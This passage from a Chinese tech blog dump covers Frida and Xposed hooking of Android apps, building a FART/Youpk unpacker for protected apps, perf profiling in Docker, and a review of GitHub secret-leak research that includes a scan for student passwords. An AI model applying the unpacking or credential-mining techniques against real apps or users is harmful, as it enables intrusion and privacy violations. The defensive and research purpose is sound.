args[1].readCString()) }, onLeave: function (ret) { console.warn(\u0026quot;ret:\u0026quot;, ret, ret.readCString()) // this.context.r0 = 1 } }) } function findModules(name) { const mods = Process.enumerateModules() const found = name ? mods.filter(m.path.includes(name)) : mods; found.forEach(m =\u0026gt; console.log(JSON.stringify(m))) console.log(found.length, \u0026quot;modules found\u0026quot;) return found } function main() { if (Java.available) { Java.perform(() =\u0026gt; { console.log(\u0026quot;Performing Java hook...\u0026quot;) hookJava(); hookJavaFunc(\u0026quot;okhttp3.Request$Builder\u0026quot;, \u0026quot;post\u0026quot;, [\u0026quot;okhttp3.RequestBody\u0026quot;], undefined, true); }) } // hookNative(); // findModules(\u0026quot;libart\u0026quot;); } setImmediate(main)  Xposed https://wooyun.js.org/drops/Android.Hook框架xposed篇(Http流量监控).html\nXposed真的可以为所欲为——终 · 庖丁解码\nhttps://www.cnblogs.com/baiqiantao/p/10699552.html\nhttps://www.huruwo.top/使用xposed-hook-native详解/\nhttps://blog.bluarry.top/2020/02/28/2020-02-28-xposed模块编写之常用hook函数API/\n流程如下： 先建安卓项目，Empty Activity 或 No Activity 均可\n在 AndroidManifest.xml 的 \u0026lt;application\u0026gt; 标签下添加\n\u0026lt;meta-data android:name=\u0026quot;xposedmodule\u0026quot; android:value=\u0026quot;true\u0026quot; /\u0026gt; \u0026lt;meta-data android:name=\u0026quot;xposeddescription\u0026quot; android:value=\u0026quot;Learn Xposed\u0026quot; /\u0026gt; \u0026lt;meta-data android:name=\u0026quot;xposedminversion\u0026quot; android:value=\u0026quot;89\u0026quot; /\u0026gt;  在 app 的 build.gradle 中添加 dependency\ncompileOnly 'de.robv.android.xposed:api:82' compileOnly 'de.robv.android.xposed:api:82:sources'  任意新建类 implements IXposedHookLoadPackage，创建文件 assets/xposed_init（Android Studio 右键 app 新建 Folder -\u0026gt; Assets Folder 即可，实际位置在 src/app/main 下），向其中写入完整类名，即可生效。\npublic void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpparam) throws Throwable { if (!lpparam.packageName.equals(lpparam.processName)) return; // 保证每个应用只在其主进程来一次 if (!lpparam.packageName.equals(\u0026quot;com.example.appname\u0026quot;)) return; }  hook原理\n","date":"2021-11-17T16:38:08+08:00","permalink":"https://chinggg.github.io/post/android-hook/","tags":["Android","逆向"],"title":"Android Hook"},{"categories":["安全"],"contents":"编译脱壳机 Pixel 3a XL 一台，代号 bonito，先恢复出厂系统 ，再准备相应源码， android-9.0.0_r47 对应 版本号 PQ3B.190801.002 对应，android-10.0.0_r2 对应 版本号 QP1A.190711.020\n首先上手编译安卓源码，从中科大源拉取 AOSP\nrepo init -u git://mirrors.ustc.edu.cn/aosp/platform/manifest -b android-10.0.0_r2 repo sync source build/envsetup.sh lunch # 选择 bonito-userdebug m # 注意装齐依赖，老版本需要 py2  拉取时：\n  为刷入真机，开始编译前必须下载并解压对应机型版本的驱动！！\n  关于 repo 工具的分析，总之要区分 Repo 自身, manifest, project 三种不同层次的 repository\n  切换不同版本时 repo forall git checkout 会带来不同 project 在 branch 上的差异，应该再次 init 并 sync\n  编译时：\n Arch Linux 下编译可参考：https://blog.firerain.me/article/13，可能要装 ncurses5-compat-libs 尽量不要用 root 用户编译，可能会有报错 flex locale 报错，改 LC_ALL=C 亦无效，进 prebuilts/misc 手动编译 flex apache-xml 报错，手动编译该部分 make clean-apache-xml make apache-xml 新增文件时，需将包名加至白名单 build/make/core/tasks/check_boot_jars/package_whitelist.txt  刷入时：\n Win 下 fastboot not detect device，安装 Google USB Driver 即可 Win 下 fastboot freeze/hang when flashing，尝试其他命令如 getvar all 远程 build 也可在本地 flash，拷贝输出目录下的*.img 至本地，ANDROID_PRODUCT_OUT=\u0026quot;./\u0026quot; fastboot flashall 即可 如果编译成功但刷入后发现无法开机，日志中有报错如  编译指南\n若有其他报错且全网难搜，先仔细看报错信息，定位相关代码是否位置与原版有出入，或是否可修改。\n只修改几处，也可能编译近几千个文件，花费数十分钟，务要小心谨慎。\n如何对 repo 进行版本管理：在对应 project 下仅添加改动的文件至暂存区，不新增 commit，也不使用 repo start 创建全局新分支，只用 repo diff 手动管理版本\n原理浅析 App 加固\n应用启动会从 ActivityThread 进入，在方法 performLaunchActivity 的最后执行 fartthread()\nYoupk 源码解读 自定义的代码几乎都封装在了 Unpacker 这个类里，额外添加 cJSON 和 unpacker 的 .h 和 .cc 共四个文件，可读性好，可惜基于 android-7.1.2_r33，会有一些大区别\nArt 部分改动的文件：\n dex2oat.cc  添加 shouldUnpack() 在 FINAL::ParseArgs() 中检查 shouldUnpack() 并 SetCompilerFilter  Android 9 的 CompilerFilter 中不再有 kVerifyAtRuntime     Android.mk(Nougat) -\u0026gt; Android.bp(Pie)  添加新文件至列表   artmethod.cc  在 Invoke() 中检查 Unpacker::isFakeInvoke() 如果是主动调用 FakeInvoke 并且是 native 方法则不执行   class_linker.h  让 Unpacker 成为 ClassLinker 的友元   runtime.cc  Runtime::RegisterRuntimeNativeMethods()   interpreter_switch_impl.cc  PREAMBLE_SAVE 中执行 beforeInstructionExecute ExecuteSwitchImplCpp 中执行 afterInstructionExecute   interpreter.cc  kInterpreterImplKind 从 kMterpImplKind 改为 kSwitchImplKind    从 Android 7 到 Android 9 导致 unpacker.cc 的改动\n 字段名与命名空间  StringPrintf 在 android::base:: 下 art:🪞:Class 下的 Status 被移到 art::ClassStatus 以 enum class PointerSize 代替 size_t，区分 32/64 位   DexFile 大变  文件移至新目录 art/libdexfile 下 DexFile 派生成 standard 和 compact CodeItem 原本 public 属性变 private，无法 offset 安卓 9 提供了 DexFile::GetCodeItemSize   ObjPtr  ClassLinker 类许多方法均返回了 ObjPtr，需调整 soa.Decode() 返回 ObjPtr，需 .Ptr()    技术进展 修改安卓源码：Art 模式下的通用脱壳方法\n脱壳原理及如何实现脱壳机\nFART 脱壳流程分析\ndex修复\n源码解析及编译支持 Pixel2\nDex起步探索\nFART 与 Youpk 结合\nFartExt之优化更深主动调用的FART10\nhttps://www.huruwo.top/fart脱壳机的使用与进阶2_fart使用相关原理和知识点/\nhttps://sentrylab.cn/blog/2022/安卓逆向-脱壳学习记录/\n问题复盘  闪退  E .bj.xhhosp.hsy: fartext ArtMethod::dumpArtMethod enter void com.XXX.healthrecord.databinding.HsIncludeMedicalRecordEditBinding.\u0026lt;init\u0026gt;(android.widget.LinearLayout, android.widget.TextView, android.widget.TextView, android.widget.LinearLayout, android.widget.TextView, android.widget.TextView, android.widget.LinearLayout, android.widget.TextView, android.widget.TextView, android.widget.LinearLayout, android.widget.TextView, android.widget.TextView, android.widget.LinearLayout, com.XXX.ui.edittext.CustomEditText, android.widget.TextView, android.widget.TextView, com.XXX.ui.edittext.CustomEditText, android.widget.TextView, com.XXX.ui.edittext.CustomEditText, android.widget.TextView, com.XXX.ui.edittext.CustomEditText, android.widget.TextView, android.widget.TextView, android.widget.TextView, android.widget.LinearLayout, android.widget.TextView, android.widget.TextView, android.widget.LinearLayout, android.widget.TextView, android.widget.TextView, android.widget.LinearLayout, android.widget.TextView, android.w  ❯ grep \u0026quot;databinding.HsIncludeMedicalRecordEditBinding\u0026quot; -Rl . ./43897952_dexfile_execute.dex ./2836792_dexfile_execute.dex ./2836792_classlist_execute.txt ./43897952_dexfile.dex ./2836792_dexfile.dex ./2836792_classlist.txt ./2836792_ins_4044.bin  进程被杀  03-10 21:37:40.391 1382 1419 I ActivityManager: Start proc 26247:com.founder.XXX/u0a105 for activity com.founder.XXX/.welcome.ui.SplashActivity 03-10 21:37:40.497 26247 26247 I ounder.shaoyan: The ClassLoaderContext is a special shared library. 03-10 21:37:40.557 1382 18390 I ActivityManager: Process com.founder.XXX (pid 26247) has died: fore TOP 03-10 21:37:40.557 1382 1420 W libprocessgroup: kill(-26247, 9) failed: No such process 03-10 21:37:40.558 1382 1420 I libprocessgroup: Successfully killed process cgroup uid 10105 pid 26247 in 0ms 03-10 21:37:40.558 772 772 I Zygote : Process 26247 exited due to signal (9) 03-10 21:37:40.564 772 772 W gdbus : type=1400 audit(0.0:1347): avc: denied { sys_nice } for capability=23 scontext=u:r:zygote:s0 tcontext=u:r:zygote:s0 tclass=capability permissive=0  ","date":"2021-11-05T23:04:43+08:00","permalink":"https://chinggg.github.io/post/fart/","tags":["Android","逆向"],"title":"安卓脱壳速成"},{"categories":["记录"],"contents":"perf 简介 性能调优基本原理 在了解具体的工具之前，我们首先应该问自己，性能分析要追踪和优化什么。我们都知道程序的运行会占用包括 CPU，内存，文件描述符，锁，磁盘，网络等等在内的各种操作系统资源。根据 Amdahl 定律，当其中的某一个或多个资源出现瓶颈的时候，我们需要找到程序中最耗费资源的地方，并对其优化。\n那么我们可能需要做如下这些事情:\n 对系统资源持续进行观测以及时发现哪些资源出现了瓶颈 统计各个程序(进程)，确定哪个或哪些进程占用了过多的资源 分析问题进程，找出其占用过量资源的原因  很多工具都可以用来要想获取这些信息，但它们本质上都是从操作系统提供的观测源查询数据，Linux 中的观测源被称为 event ，是不同内核工具框架的统一接口，大致有如下几种:\n Hardware Events: 基于 CPU 性能监视计数器 PMC Software Events: 基于内核计数器的低级事件。例如，CPU 迁移、主次缺页异常等等 Kernel Tracepoint Events: 硬编码在内核中的静态内核级的检测点，即静态探针 User Statically-Defined Tracing (USDT): 这些是用户级程序和应用程序的静态跟踪点 Dynamic Tracing: 可以被放置在任何地方的动态探针。对于内核和用户级软件，分别使用 kprobes 和 uprobes 框架 Timed Profiling: 以指定频率收集的快照。这通常用于CPU使用情况分析，其工作原理是周期性的产生时钟中断事件  而 perf 就是一个 Linux 系统中的性能分析工具，它可以利用 Hardware Events, Software Events, Tracepoint, Dynamic Tracing 来对应用程序进行性能分析，从开发者的角度来讲，它可以分析如下各种问题：\n 为什么内核消耗 CPU 高, 代码的位置在哪里？ 什么代码引起了 CPU 2级缓存未命中？ CPU 是否消耗在内存 I/O 上？ 哪些代码分配内存，分配了多少？ 什么触发了 TCP 重传？ 某个内核函数是否正在被调用，调用频率有多少？ 线程释放 CPU 的原因？  安装和使用 由于和内核的紧密关系，perf 的安装需要与内核版本相匹配，一般来讲使用发行版自带的包管理器安装即可，注意不同发行版下的包名称：\n Alpine: perf，v3.12 以上才可安装 Debian: linux-perf，注意 Debian 10 的软件源中默认只有 4.19 版本，若需 5.10 版本，可使用 buster-backports 源 Ubuntu: linux-tools-*，星号为内核版本号或 generic  如果确实无法用包管理器安装或版本不匹配，可以下载对应版本内核源码并解压，在 tools/perf 目录下自行编译。\n安装好 perf 后，可以用 perf --help 或 man perf 查看相应的帮助信息，下面仅介绍使用 perf 对应用进程进行分析的基本流程。\n首先使用 perf record -p \u0026lt;pid\u0026gt; -g 来跟踪指定进程，此时 perf 会在前台进行性能监测，并在当前目录生成 perf.data 文件，当需要终止监测时，按 C-c 等待 perf 退出。\n数据生成完毕后，可使用 perf report 在命令行下查看，如果想要可视化分析，可以结合 FlameGraph 这款工具生成 SVG 火焰图，命令如下：\ngit clone --depth=1 https://github.com/BrendanGregg/FlameGraph sudo perf script | FlameGraph/stackcollapse-perf.pl | FlameGraph/flamegraph.pl \u0026gt; flamegraph.svg  PS: perf timechart 本身也提供了导出 SVG 图片的功能，但需要 perf timechart record 来记录，而且输出的是进程运行过程中系统调度的情况，无法对程序的具体代码段进行性能分析。\nDocker 中运行 perf 实际场景中应用可能运行在 Docker 容器中，这时我们可以指定 PID 命名空间另开一个容器，使目标容器中的进程对其可见，然后在新开的容器中使用 perf 对应用进程进行分析，命令如下： docker run -it --pid=container:\u0026lt;目标容器ID\u0026gt; --network=container:\u0026lt;目标容器ID\u0026gt; \u0026lt;perf容器名\u0026gt;\n但由于 Docker 出于安全考虑对系统调用 perf_event_open 进行了限制，在执行 perf 的过程中可能出现如下 Permission Error：\nperf_event_open(..., PERF_FLAG_FD_CLOEXEC) failed with unexpected error 1 (Operation not permitted) perf_event_open(..., 0) failed unexpectedly with error 1 (Operation not permitted) You may not have permission to collect stats. Consider tweaking /proc/sys/kernel/perf_event_paranoid: -1 - Not paranoid at all 0 - Disallow raw tracepoint access for unpriv 1 - Disallow cpu events for unpriv 2 - Disallow kernel profiling for unpriv  一般可以通过三种方式解决：\n 查看宿主机 /proc/sys/kernel/perf_event_paranoid 的值，设为 -1，这样非特权用户也能调用 perf_event_open 了 在 docker run 时加上参数 --cap-add CAP_SYS_ADMIN 及 --privileged，赋予容器特权 下载一份 seccomp 默认配置文件 ，在其中给 perf_event_open 放行，保存为 custom.json，在 docker run 时加上参数 --security-opt seccomp=custom.json  在容器本身来源可靠的情况下，第二种方式应该是较为安全且方便的，下面就给出 Dockerfile 样例：\nFROM alpine:latest RUN sed -i.bak 's/dl-cdn.alpinelinux.org/mirrors.cloud.tencent.com/g' /etc/apk/repositories RUN apk add --update bash vim git perf perl thttpd RUN git clone --depth=1 https://github.com/BrendanGregg/FlameGraph RUN echo 'perf record -g -p $1' \u0026gt; record.sh \u0026amp;\u0026amp; \\ echo 'perf script | FlameGraph/stackcollapse-perf.pl | FlameGraph/flamegraph.pl \u0026gt; $1' \u0026gt; plot.sh \u0026amp;\u0026amp; \\ chmod +x *.sh ENTRYPOINT [\u0026quot;bash\u0026quot;]  为方便使用编写了一键运行脚本：\n#!/bin/bash set -x target_container_id=\u0026quot;$1\u0026quot; version=\u0026quot;$(uname -r)\u0026quot; version=\u0026quot;${version%%-*}\u0026quot; version=\u0026quot;${version%.*}\u0026quot; tag=\u0026quot;v${2-$version}\u0026quot; if [[ $tag != \u0026quot;v5.4\u0026quot; \u0026amp;\u0026amp; $tag != \u0026quot;v5.10\u0026quot; ]]; then tag=\u0026quot;latest\u0026quot; fi image=${3-\u0026quot;perf\u0026quot;} docker run \\ --cap-add CAP_SYS_ADMIN \\ --privileged \\ -ti \\ --rm \\ --pid=container:$target_container_id \\ --network=container:$target_container_id \\ $image:$tag  复制以上代码保存为 attach.sh，执行 attach.sh \u0026lt;目标容器ID\u0026gt; 就进入了 perf 容器，此时可以使用 ps 查看目标容器中的进程，记下 pid 后执行 record.sh \u0026lt;pid\u0026gt; 开始记录，记录完成后运行 plot.sh \u0026lt;图片名.svg\u0026gt; 生成火焰图。\n导出图片一般可使用 docker cp 和 docker exec 或挂载 volume，为方便预览和复制文件，容器内置了轻量网页服务，执行 thttpd -p \u0026lt;端口号\u0026gt; 即可。由于脚本中没有设置端口转发，需要 docker inspect \u0026lt;目标容器ID\u0026gt; | grep IPAdress 查看目标容器的 IP，然后在浏览器中访问即可。若需要更灵活的操作，可不用以上脚本手动添加参数运行容器。\n扩展阅读 perf 及 Linux 性能调优：\n Linux perf examples，FlameGraph 作者 Brendan Gregg 本人撰写，非常全面 Linux 性能调优系列中文博客，其中有两篇博文分别介绍 perf 的原理和使用 perf 原理和實務 性能分析利器之perf浅析 Why \u0026lsquo;perf\u0026rsquo; needs to match the exact running Linux kernel version?  Docker 中使用 perf:\n Tutorial: Profiling Rust applications in Docker with perf 详细可操作的教程，调试目标为 Rust 程序 running perf in docker \u0026amp; kubernetes  分析 .NET 应用：\n Debug high CPU usage in .NET Core Profiling .NET Core app on Linux  ","date":"2021-09-09T15:46:57Z","permalink":"https://chinggg.github.io/post/docker-perf/","tags":["调试技巧","Docker"],"title":"在 Docker 中运行 Linux 性能分析工具 perf"},{"categories":["论文"],"contents":"基本信息 摘要: GitHub 等平台使得软件协同开发的公开进行成为常态，但当公开的代码中涉及到密钥管理时，问题也随之而来，开发过程中将 API Key 或私钥添加进代码中使意外的私密泄露频繁发生。在本文中，我们将首先介绍 Git 和 GitHub Search API 等预备知识，然后对 NDSS 2019 获奖论文 How Bad Can It Git 进行回顾。最后我们还将展示针对高校学生群体的研究，结果反映公共代码仓库中的私密信息泄露无处不在，且不限于 API 和密码学意义上的私钥。尽管该问题具有较大的现实意义，但学术界对此兴趣不大，而企业已经开始应用机器学习技术尝试治理生产环境中的敏感信息泄露问题，这或许是将来的解决方案。\n关键词：数据安全，信息泄露，GitHub，自动化扫描\nAbstract: GitHub and similar platforms have made public collaborative development of software commonplace. However, problems arise when this public code must manage authentication secrets, such as API keys or cryptographic secrets, which must be kept private for security, yet common development practices like adding these secrets to code make accidental leakage frequent. In this paper, we will firstly introduce Git and GitHub Search API to provide prerequisite knowledge then review NDSS 2019 accepted paper How Bad Can It Git. And we will present our new work targeted at college students, which shows that the secret leakage on public repository platforms is ubiquitous and not limited to API keys and cryptographic secrets. Despite the severity of the problem, little academic research has been done on this topic, though some companies have been applying machine learning to prevent sensitive data leakage, which may be a promising solution in the future.\nKeywords: Data Security, Information Leakage, GitHub, Automatic Scanning\n前言 研究背景 自 GitHub 开放搜索功能以来，就有人意识到了这是一把双刃剑，别有用心者通过检索特定关键字可以轻松挖掘想要的信息，如果说邮箱地址、家庭住址等个人信息泄露仅仅是恶化了本就不容乐观的隐私状况，那私钥泄露就是真正切切地对个人和团队的资产安全造成严重威胁。而在 NDSS 2019 上，Michael Meli 等人展示了他们对 GitHub 公共仓库进行长达半年的大规模筛查后的成果，证明了 GitHub 上每天都发生着数以千计的 API Key 与非对称私钥泄露，公共代码库中的私密信息泄露还是一个亟待解决的问题。尽管企业已经着手开始主动扫描自己是否泄露了信息，他们和攻击者一样面临着同样的问题，也就是扫描的低效和较多的误报漏报。\n本文研究内容及目标 本文首先将介绍 Git 存储数据的原理以及 GitHub 等平台的相关背景信息，然后对 NDSS 2019 会议论文 How Bad Can It Git 进行复盘，介绍其研究方法与成果，并尝试以高校学生为目标群体小规模地复现，在不同的时空环境证明该问题依然存在。由于学术界对此研究并不充分，我还将介绍企业在基于机器学习的敏感信息泄露治理上进行的探索。\n预备知识 本章介绍 Git 存储数据的原理以及 GitHub 等平台的相关背景信息。\nGit 存储原理概述 为了对克隆到本地的 Git 代码仓库进行检索，需要对 Git 存储文件的方式和原理有所了解。\nGit 不仅仅是一个版本控制系统，其本质是一个内容寻址的文件系统，它的对象模型自底向上可以分为 blob，tree，commit 这三个层次。blob 只存储单个文件的内容，包括文件名在内的其他属性都保存在 tree 的记录中，tree 就像是 UNIX 文件系统中的目录，可以包含多条记录，每条记录含有一个指向 blob 对象或者 tree 对象的 SHA-1 指针，以及相应的模式、类型、文件名信息。而一个 commit 就是某一时刻保存的完整快照，它包含指向最顶层树的 tree 对象以及可能存在的父 commit 对象的 SHA-1 指针以及提交者等信息。\nGit 中的一个 commit 就是一个版本，与 SVN 等只存储版本间差异部分的版本控制系统不同，Git 会存储每一个 commit 的完整快照，但这并不会造成空间浪费，因为内容相同的对象具有相同的 SHA-1 值，在仓库中始终只会被保存一次。\nHEAD 是指向当前 commit 的指针，若不考虑暂存区，则当前工作目录下的文件就是当前 commit 中包含的文件，用户随时可以使用 git checkout 切换到某 commit，但当用户发现自己在代码中泄露密码后却往往会忘记这点，删去密码后新增 commit 便以为高枕无忧，实则已将密码永远泄露。\nGitHub 搜索功能 GitHub 提供了易用且强大的搜索功能，在搜索框里就能一键检索仓库、代码、用户、commit 等十种类型的信息，鼠标点击即可指定只显示某种编程语言的仓库或代码，还可以使用高级搜索的语法实现更精确的检索。作为服务程序员的网站，GitHub 并不参与被爬与反爬的猫鼠游戏，而是提供了丰富的 API 以便进行各类操作，其中就包括搜索，任何人只需调用短短几行代码即可获得标准的 JSON 数据，但未认证用户限制每分钟 10 次请求，用户使用 token 等方式验证后限制每分钟30次请求，而且最多返回1000条结果。\n对于代码的搜索更为特殊，在 2013 年，GitHub 限制了对代码搜索 API 的调用必须指定对某一用户或某一仓库进行(https://developer.github.com/changes/2013-10-18-new-code-search-requirements/)。但网页版中已登录的用户完全可以在所有仓库中搜索特定代码，经过测试后发现调用 API 时给出 token 也就无需指定搜索范围，耐人寻味的是这并未在官方 API 文档中给出说明。尽管做出这些限制的首要目的可能是降低成本、减轻服务器压力，但一定程度上也能阻止大规模的恶意行为。\n需要注意的是 GitHub 对搜索频率有着较大的限制，已登录的用户每小时也最多发起 5000 次 API 调用请求，尽管后文将提到 Meli 等人证明在此限制下也能做到对 GitHub 仓库 99% 的实时覆盖率，但这对我们的复现有着一定的影响，因为将搜索列表中的仓库克隆至本地前其实可以对每个仓库再调用 API 进一步获得仓库大小等信息作为筛查标准，但这样将很快触发频率上限。\nNDSS 2019 论文研究概述 本章将介绍 Michael Meli 等人在 NDSS 2019 发表的论文 How Bad Can It Git，Meli 等人并不是第一个研究 GitHub 公共仓库中私密信息泄露的团队，但他们第一次对该问题进行了大规模深入分析，综合运用各种方法进行检测，最终证明了问题的广泛存在。\n侦测秘密的方法 可分为四个阶段，如下图所示：\n确定目标私密信息的种类：主要是 Google，Amazon 等公司用于提供服务的 API Key 或 Access Token，以及由 RSA 等非对称加密算法生成的私钥，它们都有较固定的特征将其与无效的随机字符串区分开来，而人们在日常生活中更广泛使用的各类帐号密码通常是不定长度的字符组合，因此不在收集之列。最终划定了 15 种 API Key 与 4 种私钥，详见下表：\n文件收集：作者利用了两种互补的渠道。其一是 GitHub 提供的搜索 API，由于其不支持使用正则表达式搜索，作者先使用关键词查找以划定范围，再将其下载至本地以备进一步筛查，频率上的限制也并不构成障碍，只需设置返回结果按被索引时间排序，就可做到类似实时查询的效果，在实施了连续 6 个月的不间断查询后，作者发现这足以达到 99% 的文件覆盖率。其二是 Google BigQuery 上的公共数据集，它每周对 GitHub 上 13% 的开源仓库进行快照，支持进行 TB 级别的大数据查询，用户可以在 SQL 语句中使用正则表达式，但其对正则表达式的支持程度不足以精准地匹配到结果，作者将 2018 年 4 月 4 日的快照下载到了本地用于筛查。\n本地正则扫描：由于上述两种渠道无法进行在线精准查找，需要将其下载到本地，使用预先设计好的正则表达式匹配得到候选结果。\n对候选结果进行筛查：不在目标范围内的其他字符串也有一定几率通过正则匹配，作者使用了三种方法排除可能的假阳性结果：\n 信息熵筛选，每种密钥的随机程度差距应当不大，故对于每一个字符串，计算其香农信息熵，若偏离该种密钥信息熵的平均值超出三个标准差则将其排除。 单词筛，随机生成的密钥不太可能包含英语单词，为了在精确率和召回率之间保持平衡，作者将单词的范围限定为代码中常见的两千多个，且最短长度为5。 模式筛，随机生成的字符串不太可能具有某种数学上的模式，比如重复的字符，连续递增或递减的字符，若候选结果包含这样的模式且其长度超过4则将其排除。  实验结果分析 可将作者实验后得到的结果整理成如下表格：\n    GitHub Seach API BigQuery     收集仓库总数 681,784 3,374,973   收集文件总数 4,394,476 2,312,763,353   候选仓库数量 109,278 52,117   候选文件数量 307,461 100,179   候选文件命中率 约 7% 约 0.005%   候选字符串数量（含重复） 403,258 172,295   候选字符串数量（不含重复） 134,887 73,799   有效字符串数量 133,934 73,079    尽管 BigQuery 提供了 TB 级的海量数据，但从中获得的有效文件却反而更少，这可能是因为 BigQuery 只搜集具有明确 License 的仓库，这些仓库通常更加具有规范性，在其中泄露信息的可能性就相对较低。但并不能仅凭数量上的比较就认为 BigQuery 在收集信息方面不如 GitHub Search API 有用，因为作者发现仅有 3.49% 的有效字符串同时出现在两者的结果中，这说明两种渠道在很大程度上是互补的。\n除了对泄露信息的数量进行分析，作者还研究了受害者「亡羊补牢」行为发生的几率与意义，结果表明约 10% 的私密信息在 1 天内被删除， 约 20% 的私密信息在 2 周内被删除，余下约 80% 的受害者完全没有意识到自己泄露了密码。不过根据作者的研究，如果持续不断地调用 GitHub Search API 进行扫描，当秘密被上传至 GitHub 后，平均只需 20 秒就能够检测出来，因此「亡羊补牢」真的为时已晚。除此之外，作者还发现信息泄露与开发者的身份经验没有多大关联，所以任何人都有可能在不经意间泄露自己的密钥。\n针对高校学生群体的私密信息泄露研究 距离 NDSS 2019 上这篇论文发布以来，国际形势的巨大变化也影响了开源世界的面貌，首先是中美贸易战的持续升温，美国对华为等公司的制裁在国内引发了对“开源自立”的需求(https://www.oschina.net/news/106836/opensource-ourself)，Gitee 寄托着人们的希望乘势而起，却又始终难以替代 GitHub 的开发者生态；其次是新冠疫情的肆虐让远程协同开发成为摆在人们面前的现实，最后还不得不提到微软于 2018 年 6 月 4 日收购 GitHub 这件大事，因为 Meli 等人对 GitHub 的挖掘是其被收购前进行的，GitHub 被微软收购后并没有如最初人们所担心的那样毁于微软之手，相反微软的财力支持使得 GitHub 能够免费为个人用户提供无限的私有仓库，而在此之前 GitHub 的私有仓库是收费功能，这是一项重大变化。\n本文原打算将研究对象设为国内最大的代码托管平台 Gitee（码云），以对比其与 GitHub 在私密信息泄漏上的差异，但发现 Gitee 的 API 极为有限，曾经推出代码搜索的功能却又不知何时悄然下线，目前仅支持搜索仓库、Issue 和博客的搜索，正常用户的搜索体验都难以保障，想要挖掘私密信息更是无从下手。\n因此本文仍将以 GitHub 作为挖掘信息的对象，但与 Meli 等人主要研究 API Key 或非对称加密算法的私钥不同，本文将探讨针对特定群体挖掘其个人账户信息的可能性。\n现有工具分析 truffleHog 是一个能够深入搜寻 Git 仓库自动挖掘私密信息的工具，它的工作原理并不复杂：借助于 GitPython 模块，它可以将远程的 Git 仓库克隆至本地，然后从某一分支的某一 commit 开始向遍历，每次将前一 commit 与后一 commit 的 diff 转化成字符串，再基于正则表达式匹配和信息熵分析找出可疑字符串，利用 bcolors 模块将其标注成特殊颜色，然后将其所属 commit 等元信息一并封装后添加到返回的结果中。\nGitDorker 则是一个利用 GitHub Search API 进行批量查询的工具，它不会将仓库克隆至本地而仅仅只会使用关键字查询，但其提供了较丰富的命令行参数，可以对用户、组织、文件进行搜索，而且提供了对频率限制的等待处理，可以将其作为外围信息搜集的工具来限定仓库范围。\n时间所限，本文并未研发新的工具，而是借鉴了 GitDorker 的思想，在 truffleHog 的基础上新增了对 GitHub Search API 的调用，得到目标 URL 的列表后让 truffleHog 可以对多个目标进行批量扫描，访问 https://gitee.com/libgen/truffleHog 可查看所有代码及开发记录\n跨时空的复现 尽管国内高校学生群体中 GitHub 的流行程度可能不是很高，但总人数还是颇为可观，不少学生以开源项目贡献者的身份活跃，也有人只是默默将平时所做的课程项目上传，总体来说还是围绕校园生活居多，比如模拟选课系统与教务管理系统等。尤其是随着疫情的到来，许多学生自发编写维护了一些便利日常生活的小脚本，这种开源共享的精神值得赞许，但背后却也隐藏着不小的安全隐患。这些程序虽功能各异，但却往往都会使用学号与密码向学校服务器发送登录请求，稍有不慎忘记删除测试时使用的帐号密码便公开上传至 GitHub。\n泄密从开始到最终完成需要受害者和攻击者双方的共同努力，若无有效的挖掘方法，则学号密码的泄露较难构成系统性的风险，本文将以上海某大学为例，证明仅在现有工具的基础上稍作修改就可自动进行针对大学生群体的密码挖掘。\n与 API Key 和 RSA 等非对称加密算法不同，学生的密码通常是不定长度的数字字符组合，难以使用正则表达式规定，但学号的结构相对较为固定，故而能够使用正则表达式进行匹配。不过仅凭学号本身去搜寻无疑于大海捞针，要想缩减查找范围，必须引入外部信息，注意到学号姓名往往用于登录学校帐号，故可以想到先调用 GitHub Search API 搜索包含学校域名的代码，获取到对应的仓库即可加入候选列表，然后将候选列表中的这些仓库下载至本地进行分析与筛选即可。\n在对结果进行手动分析的过程中，发现了较多的假阳性数据，这与 Meli 等人的研究得出的结论不同，在他们的研究中 99% 的候选字符串都通过了三轮筛查故被认为是有效的，这可能是由于 API Key 和非对称私钥的特征更为显著故而可用正则表达式精准地匹配，也不排除 Meli 等人的筛查效果其实不佳，没能够找出真正的假阳性数据。\n观察假阳性数据的来源仓库，发现尽管使用了学校域名作为限制，但结果中仍会出现来自世界各地的奇怪仓库，这一方面是由于该学校曾经搭建过开源镜像站，许多仓库中将开源镜像站的网址写入了文件中，故而被添加到了候选结果；另一方面是由于一些仓库中存放了大量爬取的数据，许多网页中都可能包含该学校域名，这些仓库往往体积巨大且有较多 commit，需要耗费大量时间扫描。\n在对泄密文件的类型和具体字符串进行统计后，我们发现 Python 源码的数量一骑绝尘，是第二名 jsx 的两倍之多，但 jsx 理论上很少用于存放敏感信息，经观察发现这只是正好有仓库的 jsx 文件中出现了大量符合学号规则的同一数字，故而 jsx 中全为假阳性数据，真正排第二的泄密文件类型应当是 Java 源码，高校学生经常用 Python 编写脚本，用 Java 编写后端代码，故而这两种文件类型中理应泄密较多。这可能也反映了学生尚未养成将配置与代码分离的习惯，倾向于在代码中硬编码账号密码等个人信息，而较少使用单独配置文件，故非代码文件中的往往是假阳性数据。\n针对以上场景，本文使用了三种筛法：\n 仓库体积筛，我们认为大学生自建仓库的文件体积一般不超过 100 MB，体积更大的仓库也更可能无关核心代码而只是大量数据的杂乱堆砌，将之排除能减轻网络负担。GitHub 关于单个仓库的 API 返回了仓库体积的信息，使得我们可以免于克隆整个仓库而判断体积大小，但代价是对每个仓库都进行了一次 API 调用，容易达到每小时 5000 次的总调用次数上限。 仓库 commit 数筛，我们认为大学生自建仓库的 commit 数一般不超过 500，commit 数更多则该仓库更可能是类似博客的仓库，会自动提交生成大量无用静态文件，将之排除能减少扫描所耗时间 文件类型筛，我们发现 Python 源码中泄露的信息最多，各种源码和配置文件中也都有泄露信息的可能，多数假阳性数据都出现在各种非代码类型的文件中，多数假阳性数据都出现在各种非代码类型的文件中，故而使用黑名单或白名单可以提高命中率，我们同样通过 GitPython 模块实现了黑名单功能。  经过上述筛查之后，扫描的准确程度有了较大提高，具体数量这里就不作展示，只能说高校学生在参与开源的同时必须提高自身的安全意识，如图所示为不了解 Git 原理而导致的典型密码泄漏：\n面向个人的安全措施 各大公司已经开始与 GitHub 合作以扫描泄露的 API Key 并向用户报警，但高校学生群体显然只能依靠自己，现在总结出一些安全措施：\n 从源头着手，既然 GitHub 已向个人用户免费开放私有仓库，那么可以优先考虑使用私有仓库 从代码着手，需要避免密码进入源文件，可以使用环境变量或单独的文件存储密码 从检查着手，可以在上传之前使用 git-secret 等工具检测是否 commit 了私密信息 从追溯着手，可以使用现成的扫描工具定期对自己的仓库进行扫描并发送提醒  总结与展望 本文介绍了 GitHub 